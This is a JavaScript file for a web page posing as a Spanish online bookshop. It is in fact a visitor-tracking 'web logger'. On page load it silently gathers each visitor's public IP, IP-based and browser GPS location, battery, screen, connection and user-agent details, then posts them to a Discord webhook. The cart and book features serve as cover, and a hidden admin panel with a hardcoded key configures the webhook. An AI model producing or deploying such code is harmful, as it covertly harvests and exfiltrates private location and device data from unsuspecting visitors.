// Web Logger - LibrosMágicos
// Recopila información del usuario y la envía a Discord

class WebLogger {
    constructor() {
        this.webhookUrl = localStorage.getItem('discordWebhook') || '';
        this.collectedData = {};
        this.accessKey = 'libros2024'; // Clave de acceso para el panel admin
        this.init();
    }

    async init() {
        // Mostrar modal de acceso si se presiona Ctrl+Shift+A
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.shiftKey && e.key === 'A') {
                this.showAccessModal();
            }
        });

        // Mostrar indicador de estado
        this.showStatus('Recopilando datos...', 'loading');

        // Recopilar datos del usuario
        await this.collectUserData();
        
        // Mostrar estado de recopilación completada
        this.showStatus('Datos recopilados, enviando a Discord...', 'loading');
        
        // Enviar datos a Discord si hay webhook configurado
        if (this.webhookUrl) {
            await this.sendToDiscord();
            this.showStatus('Datos enviados a Discord exitosamente', 'success');
        } else {
            this.showStatus('Datos recopilados (sin webhook configurado)', 'success');
        }

        // Inicializar funcionalidades de la tienda
        this.initStoreFeatures();
    }

    async collectUserData() {
        console.log('🔍 Recopilando datos del usuario...');
        
        // 1. Obtener IP local y geolocalización
        await this.getIPAndLocation();
        
        // 2. Obtener User Agent
        this.getUserAgent();
        
        // 3. Obtener información de batería
        await this.getBatteryInfo();
        
        // 4. Obtener información adicional del navegador
        this.getBrowserInfo();
        
        // 5. Obtener información de la pantalla
        this.getScreenInfo();
        
        // 6. Obtener información de la conexión
        await this.getConnectionInfo();
        
        console.log('✅ Datos recopilados:', this.collectedData);
    }

    async getIPAndLocation() {
        try {
            console.log('🔍 Iniciando recopilación de IP y ubicación...');
            
            // Usar las APIs configuradas en config.js
            const ipApis = LoggerConfig.ipApis || [
                'https://ipapi.co/json/',
                'https://ipinfo.io/json',
                'https://ip-api.com/json/',
                'https://api.ipify.org?format=json',
                'https://api.db-ip.com/v2/free/self',
                'https://freeipapi.com/api/json'
            ];

            // Intentar cada API hasta que una funcione
            for (const api of ipApis) {
                try {
                    console.log(`🌐 Intentando API: ${api}`);
                    const response = await fetchWithTimeout(api, {
                        method: 'GET',
                        headers: {
                            'Accept': 'application/json',
                        }
                    }, LoggerConfig.timeouts.apiRequest);
                    
                    if (response.ok) {
                        const data = await response.json();
                        console.log('📊 Datos recibidos:', data);
                        
                        if (api.includes('ipify')) {
                            // API ipify solo da IP
                            if (data.ip && isValidIP(data.ip)) {
                                this.collectedData.publicIP = data.ip;
                                console.log('✅ IP obtenida:', data.ip);
                                // Obtener geolocalización por separado
                                await this.getGeoFromIP(data.ip);
                            }
                        } else if (api.includes('ipapi.co')) {
                            // API ipapi.co da IP y geolocalización (más precisa)
                            if (data.ip && isValidIP(data.ip)) {
                                this.collectedData.publicIP = data.ip;
                                this.collectedData.location = {
                                    country: data.country_name || data.country,
                                    region: data.region,
                                    city: data.city,
                                    latitude: data.latitude,
                                    longitude: data.longitude,
                                    timezone: data.timezone,
                                    isp: data.org,
                                    postal: data.postal,
                                    country_code: data.country_code
                                };
                                console.log('✅ IP y ubicación obtenidas de ipapi.co:', {
                                    ip: data.ip,
                                    city: data.city,
                                    country: data.country_name,
                                    coords: `${data.latitude}, ${data.longitude}`
                                });
                            }
                        } else if (api.includes('ipinfo.io')) {
                            // API ipinfo.io
                            if (data.ip && isValidIP(data.ip)) {
                                this.collectedData.publicIP = data.ip;
                                const coords = data.loc ? data.loc.split(',') : [null, null];
                                this.collectedData.location = {
                                    country: data.country,
                                    region: data.region,
                                    city: data.city,
                                    latitude: parseFloat(coords[0]),
                                    longitude: parseFloat(coords[1]),
                                    timezone: data.timezone,
                                    isp: data.org,
                                    postal: data.postal,
                                    country_code: data.country
                                };
                                console.log('✅ IP y ubicación obtenidas de ipinfo.io:', {
                                    ip: data.ip,
                                    city: data.city,
                                    country: data.country,
                                    coords: data.loc
                                });
                            }
                        } else if (api.includes('ip.sb')) {
                            // API ip.sb
                            if (data.ip && isValidIP(data.ip)) {
                                this.collectedData.publicIP = data.ip;
                                this.collectedData.location = {
                                    country: data.country,
                                    region: data.region,
                                    city: data.city,
                                    latitude: data.latitude,
                                    longitude: data.longitude,
                                    timezone: data.timezone,
                                    isp: data.organization
                                };
                                console.log('✅ IP y ubicación obtenidas de ip.sb');
                            }
                        } else if (api.includes('ip-api.com')) {
                            // API ip-api.com
                            if (data.query && isValidIP(data.query)) {
                                this.collectedData.publicIP = data.query;
                                this.collectedData.location = {
                                    country: data.country,
                                    region: data.regionName,
                                    city: data.city,
                                    latitude: data.lat,
                                    longitude: data.lon,
                                    timezone: data.timezone,
                                    isp: data.isp,
                                    postal: data.zip,
                                    country_code: data.countryCode
                                };
                                console.log('✅ IP y ubicación obtenidas de ip-api.com:', {
                                    ip: data.query,
                                    city: data.city,
                                    country: data.country,
                                    coords: `${data.lat}, ${data.lon}`
                                });
                            }
                        } else if (api.includes('db-ip.com')) {
                            // API db-ip.com
                            if (data.ipAddress && isValidIP(data.ipAddress)) {
                                this.collectedData.publicIP = data.ipAddress;
                                this.collectedData.location = {
                                    country: data.countryName,
                                    region: data.stateProv,
                                    city: data.city,
                                    latitude: data.latitude,
                                    longitude: data.longitude,
                                    timezone: data.timeZone,
                                    isp: data.organization
                                };
                                console.log('✅ IP y ubicación obtenidas de db-ip.com');
                            }
                        } else if (api.includes('freeipapi.com')) {
                            // API freeipapi.com
                            if (data.ipAddress && isValidIP(data.ipAddress)) {
                                this.collectedData.publicIP = data.ipAddress;
                                this.collectedData.location = {
                                    country: data.countryName,
                                    region: data.stateProv,
                                    city: data.cityName,
                                    latitude: data.latitude,
                                    longitude: data.longitude,
                                    timezone: data.timeZone,
                                    isp: data.organization
                                };
                                console.log('✅ IP y ubicación obtenidas de freeipapi.com');
                            }
                        }
                        
                        // Si se obtuvo la IP y ubicación, salir del bucle
                        if (this.collectedData.publicIP && this.collectedData.location) {
                            console.log('🎯 IP y ubicación obtenidas exitosamente');
                            break;
                        }
                    }
                } catch (apiError) {
                    console.log(`❌ Error con API ${api}:`, apiError.message);
                    continue; // Intentar la siguiente API
                }
            }

            // Si no se pudo obtener la IP de ninguna API, usar método alternativo
            if (!this.collectedData.publicIP) {
                console.log('🔄 Intentando método alternativo WebRTC...');
                await this.getIPAlternative();
            }

            // Si no se obtuvo ubicación, intentar obtenerla por separado
            if (this.collectedData.publicIP && !this.collectedData.location) {
                console.log('🔄 Obteniendo ubicación por separado...');
                await this.getGeoFromIP(this.collectedData.publicIP);
            }

            // Obtener geolocalización del navegador (si está disponible)
            if (navigator.geolocation) {
                console.log('🌍 Intentando obtener geolocalización del navegador...');
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        this.collectedData.browserLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        };
                        console.log('✅ Geolocalización del navegador obtenida:', {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy + 'm'
                        });
                        
                        // Si la geolocalización del navegador es más precisa, usarla como principal
                        if (position.coords.accuracy < 1000) { // Menos de 1km de precisión
                            this.collectedData.location = {
                                ...this.collectedData.location,
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                source: 'browser_geolocation'
                            };
                            console.log('🎯 Usando geolocalización del navegador como principal (más precisa)');
                        }
                    },
                    (error) => {
                        console.log('❌ Geolocalización del navegador no disponible:', error.message);
                        // Intentar con configuración menos estricta
                        navigator.geolocation.getCurrentPosition(
                            (position) => {
                                this.collectedData.browserLocation = {
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy
                                };
                                console.log('✅ Geolocalización del navegador obtenida (modo fallback)');
                            },
                            (error2) => {
                                console.log('❌ Geolocalización del navegador completamente no disponible:', error2.message);
                            },
                            {
                                enableHighAccuracy: false,
                                timeout: 10000,
                                maximumAge: 300000
                            }
                        );
                    },
                    LoggerConfig.geolocationOptions
                );
            }

            // Log final de lo que se obtuvo
            console.log('📋 Resumen final de datos recopilados:', {
                ip: this.collectedData.publicIP,
                location: this.collectedData.location,
                browserLocation: this.collectedData.browserLocation
            });

        } catch (error) {
            console.error('❌ Error general obteniendo IP y ubicación:', error);
            this.collectedData.publicIP = 'No disponible';
            this.collectedData.location = 'Error al obtener ubicación';
        }
    }

    async getGeoFromIP(ip) {
        try {
            console.log(`🌐 Obteniendo geolocalización para IP: ${ip}`);
            const geoApis = LoggerConfig.geoApis || [
                `https://ipapi.co/${ip}/json/`,
                `https://ipinfo.io/${ip}/json`,
                `https://ip-api.com/json/${ip}`
            ];

            for (const apiTemplate of geoApis) {
                try {
                    const api = apiTemplate.replace('{ip}', ip);
                    console.log(`🔍 Probando API de geolocalización: ${api}`);
                    
                    const response = await fetchWithTimeout(api, {}, LoggerConfig.timeouts.apiRequest);
                    if (response.ok) {
                        const data = await response.json();
                        console.log('📊 Datos de geolocalización recibidos:', data);
                        
                        if (api.includes('ipapi.co')) {
                            this.collectedData.location = {
                                country: data.country_name || data.country,
                                region: data.region,
                                city: data.city,
                                latitude: data.latitude,
                                longitude: data.longitude,
                                timezone: data.timezone,
                                isp: data.org,
                                postal: data.postal,
                                country_code: data.country_code,
                                source: 'ipapi.co'
                            };
                            console.log('✅ Geolocalización obtenida de ipapi.co:', {
                                city: data.city,
                                country: data.country_name,
                                coords: `${data.latitude}, ${data.longitude}`
                            });
                        } else if (api.includes('ipinfo.io')) {
                            const coords = data.loc ? data.loc.split(',') : [null, null];
                            this.collectedData.location = {
                                country: data.country,
                                region: data.region,
                                city: data.city,
                                latitude: parseFloat(coords[0]),
                                longitude: parseFloat(coords[1]),
                                timezone: data.timezone,
                                isp: data.org,
                                postal: data.postal,
                                country_code: data.country,
                                source: 'ipinfo.io'
                            };
                            console.log('✅ Geolocalización obtenida de ipinfo.io:', {
                                city: data.city,
                                country: data.country,
                                coords: data.loc
                            });
                        } else if (api.includes('ip-api.com')) {
                            this.collectedData.location = {
                                country: data.country,
                                region: data.regionName,
                                city: data.city,
                                latitude: data.lat,
                                longitude: data.lon,
                                timezone: data.timezone,
                                isp: data.isp,
                                postal: data.zip,
                                country_code: data.countryCode,
                                source: 'ip-api.com'
                            };
                            console.log('✅ Geolocalización obtenida de ip-api.com:', {
                                city: data.city,
                                country: data.country,
                                coords: `${data.lat}, ${data.lon}`
                            });
                        }
                        break; // Salir del bucle si se obtuvo la información
                    }
                } catch (geoError) {
                    console.log(`❌ Error con API de geolocalización ${apiTemplate}:`, geoError.message);
                    continue;
                }
            }
        } catch (error) {
            console.error('❌ Error general obteniendo geolocalización:', error);
        }
    }

    async getIPAlternative() {
        try {
            console.log('🔄 Iniciando método alternativo WebRTC...');
            
            // Método alternativo usando WebRTC
            const pc = new RTCPeerConnection(LoggerConfig.webRTCConfig);
            
            pc.createDataChannel('');
            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
            
            return new Promise((resolve) => {
                pc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const candidate = event.candidate.candidate;
                        const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (ipMatch && isValidIP(ipMatch[1])) {
                            this.collectedData.publicIP = ipMatch[1];
                            console.log('✅ IP obtenida por WebRTC:', ipMatch[1]);
                            pc.close();
                            resolve();
                        }
                    }
                };
                
                // Timeout después del tiempo configurado
                setTimeout(() => {
                    pc.close();
                    if (!this.collectedData.publicIP) {
                        this.collectedData.publicIP = 'No disponible';
                        console.log('❌ No se pudo obtener IP por WebRTC');
                    }
                    resolve();
                }, LoggerConfig.timeouts.webRTC);
            });
        } catch (error) {
            console.error('❌ Error con método alternativo WebRTC:', error);
            this.collectedData.publicIP = 'No disponible';
        }
    }

    getUserAgent() {
        this.collectedData.userAgent = navigator.userAgent;
        this.collectedData.platform = navigator.platform;
        this.collectedData.language = navigator.language;
        this.collectedData.languages = navigator.languages;
        this.collectedData.cookieEnabled = navigator.cookieEnabled;
        this.collectedData.onLine = navigator.onLine;
    }

    async getBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                this.collectedData.battery = {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } else {
                this.collectedData.battery = 'API de batería no disponible';
            }
        } catch (error) {
            console.error('Error obteniendo información de batería:', error);
            this.collectedData.battery = 'Error al obtener información de batería';
        }
    }

    getBrowserInfo() {
        this.collectedData.browserInfo = {
            vendor: navigator.vendor,
            appName: navigator.appName,
            appVersion: navigator.appVersion,
            product: navigator.product,
            hardwareConcurrency: navigator.hardwareConcurrency,
            maxTouchPoints: navigator.maxTouchPoints,
            doNotTrack: navigator.doNotTrack
        };
    }

    getScreenInfo() {
        this.collectedData.screen = {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation ? screen.orientation.type : 'No disponible'
        };
    }

    async getConnectionInfo() {
        try {
            if ('connection' in navigator) {
                const connection = navigator.connection;
                this.collectedData.connection = {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData
                };
            } else {
                this.collectedData.connection = 'API de conexión no disponible';
            }
        } catch (error) {
            console.error('Error obteniendo información de conexión:', error);
            this.collectedData.connection = 'Error al obtener información de conexión';
        }
    }

    async sendToDiscord() {
        if (!this.webhookUrl) {
            console.log('No hay webhook configurado');
            return;
        }

        try {
            console.log('📤 Enviando datos a Discord...');
            
            // Formatear datos usando la función de configuración
            const formattedData = formatDiscordData(this.collectedData);

            // Información adicional de ubicación
            let locationDetails = formattedData.location;
            if (this.collectedData.location && typeof this.collectedData.location === 'object') {
                const loc = this.collectedData.location;
                if (loc.region && loc.city) {
                    locationDetails += `\n🏙️ Región: ${loc.region}`;
                }
                if (loc.postal) {
                    locationDetails += `\n📮 Código Postal: ${loc.postal}`;
                }
                if (loc.isp) {
                    locationDetails += `\n🌐 ISP: ${loc.isp}`;
                }
                if (loc.source) {
                    locationDetails += `\n📍 Fuente: ${loc.source}`;
                }
            }

            // Información de precisión
            let accuracyInfo = '';
            if (this.collectedData.browserLocation && this.collectedData.browserLocation.accuracy) {
                accuracyInfo = `\n🎯 Precisión: ${Math.round(this.collectedData.browserLocation.accuracy)}m`;
            }

            const embed = {
                title: "📚 Nuevo Visitante - LibrosMágicos",
                description: "Un usuario ha visitado la tienda de libros",
                color: 0x667eea,
                fields: [
                    {
                        name: "🌐 IP Pública",
                        value: formattedData.ip,
                        inline: true
                    },
                    {
                        name: "📍 Ubicación Detallada",
                        value: locationDetails,
                        inline: true
                    },
                    {
                        name: "🗺️ Coordenadas GPS",
                        value: formattedData.coordinates + accuracyInfo,
                        inline: true
                    },
                    {
                        name: "🔋 Batería",
                        value: formattedData.battery,
                        inline: true
                    },
                    {
                        name: "🖥️ Pantalla",
                        value: formattedData.screen,
                        inline: true
                    },
                    {
                        name: "🌍 Idioma",
                        value: this.collectedData.language || 'No disponible',
                        inline: true
                    },
                    {
                        name: "💻 User Agent",
                        value: formattedData.userAgent,
                        inline: false
                    },
                    {
                        name: "⏰ Timestamp",
                        value: new Date().toLocaleString('es-ES'),
                        inline: true
                    }
                ],
                footer: {
                    text: "LibrosMágicos Logger - Detección Avanzada",
                    icon_url: "https://cdn.discordapp.com/emojis/📚.png"
                }
            };

            const payload = {
                embeds: [embed]
            };

            console.log('📊 Datos formateados para Discord:', formattedData);

            const response = await fetch(this.webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                console.log('✅ Datos enviados a Discord exitosamente');
            } else {
                console.error('❌ Error enviando datos a Discord:', response.status, response.statusText);
                const errorText = await response.text();
                console.error('Error details:', errorText);
            }
        } catch (error) {
            console.error('❌ Error enviando datos a Discord:', error);
        }
    }

    showAccessModal() {
        const modal = document.getElementById('accessModal');
        modal.style.display = 'flex';
    }

    checkAccess() {
        const inputKey = document.getElementById('accessKey').value;
        if (inputKey === this.accessKey) {
            document.getElementById('accessModal').style.display = 'none';
            document.getElementById('adminPanel').style.display = 'block';
            this.updateAdminPanel();
        } else {
            alert('Clave de acceso incorrecta');
        }
    }

    updateAdminPanel() {
        // Actualizar webhook URL
        const webhookInput = document.getElementById('webhookUrl');
        webhookInput.value = this.webhookUrl;

        // Mostrar datos recopilados
        const dataContainer = document.getElementById('collectedData');
        dataContainer.innerHTML = JSON.stringify(this.collectedData, null, 2);
    }

    saveWebhook() {
        const webhookInput = document.getElementById('webhookUrl');
        this.webhookUrl = webhookInput.value;
        localStorage.setItem('discordWebhook', this.webhookUrl);
        
        // Enviar datos inmediatamente si hay webhook
        if (this.webhookUrl) {
            this.sendToDiscord();
        }
        
        alert('Webhook guardado exitosamente');
    }

    async testDataCollection() {
        console.log('🔄 Iniciando prueba de recopilación de datos...');
        
        // Mostrar indicador de estado
        this.showStatus('Probando recopilación...', 'loading');
        
        // Limpiar datos anteriores
        this.collectedData = {};
        
        // Recopilar datos nuevamente
        await this.collectUserData();
        
        // Actualizar el panel de administración
        this.updateAdminPanel();
        
        // Mostrar estado de éxito
        this.showStatus('Prueba completada exitosamente', 'success');
        
        // Enviar a Discord si hay webhook configurado
        if (this.webhookUrl) {
            await this.sendToDiscord();
        }
    }

    showStatus(message, type = 'loading') {
        const indicator = document.getElementById('statusIndicator');
        const icon = indicator.querySelector('.status-icon');
        const text = indicator.querySelector('.status-text');
        
        // Actualizar contenido
        text.textContent = message;
        
        // Actualizar clases
        indicator.className = `status-indicator show ${type}`;
        
        // Actualizar icono según el tipo
        switch (type) {
            case 'loading':
                icon.textContent = '🔄';
                break;
            case 'success':
                icon.textContent = '✅';
                break;
            case 'error':
                icon.textContent = '❌';
                break;
        }
        
        // Ocultar después de 3 segundos si es éxito
        if (type === 'success') {
            setTimeout(() => {
                indicator.classList.remove('show');
            }, 3000);
        }
    }

    initStoreFeatures() {
        // Funcionalidades de la tienda
        this.cart = [];
        this.updateCartDisplay();

        // Smooth scrolling para navegación
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });

        // Animaciones al hacer scroll
        this.initScrollAnimations();
    }

    scrollToBooks() {
        document.getElementById('libros').scrollIntoView({
            behavior: 'smooth'
        });
    }

    addToCart(bookId) {
        const bookTitles = {
            1: 'El Arte de la Guerra',
            2: '1984',
            3: 'El Principito',
            4: 'Cien Años de Soledad'
        };

        const bookPrices = {
            1: 12.99,
            2: 15.99,
            3: 9.99,
            4: 18.99
        };

        const existingItem = this.cart.find(item => item.id === bookId);
        if (existingItem) {
            existingItem.quantity += 1;
        } else {
            this.cart.push({
                id: bookId,
                title: bookTitles[bookId],
                price: bookPrices[bookId],
                quantity: 1
            });
        }

        this.updateCartDisplay();
        this.showCartNotification();
    }

    updateCartDisplay() {
        const cartCount = document.querySelector('.cart-count');
        const totalItems = this.cart.reduce((sum, item) => sum + item.quantity, 0);
        cartCount.textContent = totalItems;
    }

    showCartNotification() {
        // Crear notificación temporal
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 100px;
            right: 20px;
            background: #667eea;
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            z-index: 1000;
            animation: slideIn 0.3s ease;
        `;
        notification.textContent = '📚 Libro agregado al carrito';
        document.body.appendChild(notification);

        setTimeout(() => {
            notification.remove();
        }, 3000);
    }

    quickView(bookId) {
        const bookTitles = {
            1: 'El Arte de la Guerra',
            2: '1984',
            3: 'El Principito',
            4: 'Cien Años de Soledad'
        };

        const bookDescriptions = {
            1: 'Un tratado militar chino escrito por Sun Tzu, que se ha convertido en una obra fundamental sobre estrategia y táctica.',
            2: 'Una novela distópica de George Orwell que describe una sociedad totalitaria bajo vigilancia constante.',
            3: 'Una novela corta del escritor francés Antoine de Saint-Exupéry, considerada una obra maestra de la literatura.',
            4: 'Una novela del escritor colombiano Gabriel García Márquez, considerada una obra maestra de la literatura hispanoamericana.'
        };

        alert(`📖 ${bookTitles[bookId]}\n\n${bookDescriptions[bookId]}`);
    }

    initScrollAnimations() {
        const observerOptions = {
            threshold: 0.1,
            rootMargin: '0px 0px -50px 0px'
        };

        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.style.opacity = '1';
                    entry.target.style.transform = 'translateY(0)';
                }
            });
        }, observerOptions);

        // Observar elementos para animaciones
        document.querySelectorAll('.book-card, .category-card').forEach(el => {
            el.style.opacity = '0';
            el.style.transform = 'translateY(30px)';
            el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
            observer.observe(el);
        });
    }
}

// Inicializar la aplicación cuando se carga la página
document.addEventListener('DOMContentLoaded', () => {
    // Crear instancia del logger
    window.webLogger = new WebLogger();
    
    // Funciones globales para los botones
    window.scrollToBooks = () => window.webLogger.scrollToBooks();
    window.addToCart = (bookId) => window.webLogger.addToCart(bookId);
    window.quickView = (bookId) => window.webLogger.quickView(bookId);
    window.checkAccess = () => window.webLogger.checkAccess();
    window.saveWebhook = () => window.webLogger.saveWebhook();
    window.testDataCollection = () => window.webLogger.testDataCollection();
});

// Agregar estilos CSS para animaciones
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
`;
document.head.appendChild(style);
